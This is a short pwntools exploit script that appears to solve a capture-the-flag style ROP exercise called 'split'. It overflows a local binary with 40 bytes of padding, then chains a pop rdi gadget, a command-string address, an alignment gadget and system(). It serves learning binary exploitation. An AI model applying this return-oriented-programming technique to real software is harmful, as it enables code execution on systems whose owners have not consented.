from pwn import *

context.binary = "./split"
p = process()

offset_padding = b"A"*40
pop_rdi_gadget = p64(0x4007c3)
print_flag_cmd = p64(0x601060)
allignment = p64(0x40053e)
system_addr = p64(0x400560)

p.sendline(offset_padding + pop_rdi_gadget +
           print_flag_cmd + allignment + system_addr)


p.interactive()
